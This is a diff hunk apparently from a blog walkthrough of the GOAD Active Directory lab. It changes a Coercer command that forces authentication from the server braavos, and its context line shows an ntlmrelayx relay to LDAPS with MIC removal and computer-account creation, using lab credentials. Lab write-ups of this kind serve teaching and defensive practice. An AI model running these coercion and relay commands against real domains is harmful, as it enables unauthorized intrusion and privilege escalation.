@@ -284,7 +284,7 @@ ntlmrelayx -t ldaps://meereen.essos.local -smb2support --remove-mic --add-comput
 - Run the coerce authentication on braavos (braavos is a windows server 2016 up to date so petitpotam unauthenticated will not work here)
 
 ```bash
-python3 coercer.py -u khal.drogo -d essos.local -p horse -t braavos.essos.local -l 192.168.56.1
+python3 coercer.py coerce -u khal.drogo -d essos.local -p horse -t braavos.essos.local -l 192.168.56.1
 ```
 
 ![remove_mic.png](/assets/blog/GOAD/remove_mic.png)
